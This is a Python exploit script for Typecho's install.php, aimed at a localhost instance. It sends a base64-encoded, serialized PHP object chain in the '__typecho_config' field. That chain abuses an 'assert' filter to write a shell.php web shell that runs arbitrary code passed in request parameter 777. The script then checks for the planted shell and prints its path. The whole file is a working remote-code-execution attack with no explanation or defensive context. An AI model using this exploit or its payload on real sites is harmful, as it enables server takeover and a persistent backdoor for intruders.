import requests 
import sys 
url = "http://localhost/typecho/install.php?finish="
payload = "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU4OiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbNzc3XSk/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTg6ImZwdXRzKGZvcGVuKCdzaGVsbC5waHAnLCd3JyksJzw/PUBldmFsKCRfUkVRVUVTVFs3NzddKT8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9" 
postData = {"__typecho_config":payload} 
header ={ 
	"Referer":url, 
	"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"} 
	
print(url) 
res = requests.get(url) 
if res.status_code == 200: 
	print("[+] install.php exist!") 
else: 
	print("[-] install.php not exist") 
	sys.exit() 
	
res = requests.post(url = url,data = postData,headers = header) 
res = requests.get(url+"shell.php") 
if res.status_code == 200: 
	print("[+] Shell.php write success!") 
	print("Shell path :",url+"shell.php") 
else: 
	print("[-] GetShell Error!")